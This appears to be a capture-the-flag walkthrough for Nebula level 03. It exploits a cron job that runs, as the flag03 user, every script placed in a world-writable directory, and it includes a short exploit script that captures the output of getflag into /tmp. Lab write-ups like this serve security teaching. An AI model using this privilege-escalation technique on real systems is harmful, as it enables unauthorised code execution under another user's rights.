# Level 03

This level tells us there there's a cron job that runs the following script as the flag03 user:

```bash
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

```

Note: The /home/flag03/writable.d is world writeable.

All we need to do is create a script, put it in writeable.d and wait for it to execute.

exploit.sh
```bash
#!/bin/bash

/bin/getflag >> /tmp/flag03
chmod +r /tmp/flag03
```

```bash
level03@nebula:/home/flag03$ cp /tmp/exploit.sh writable.d/

level03@nebula:/home/flag03$ ls writable.d/
exploit.sh

level03@nebula:/home/flag03$ cat /tmp/flag03
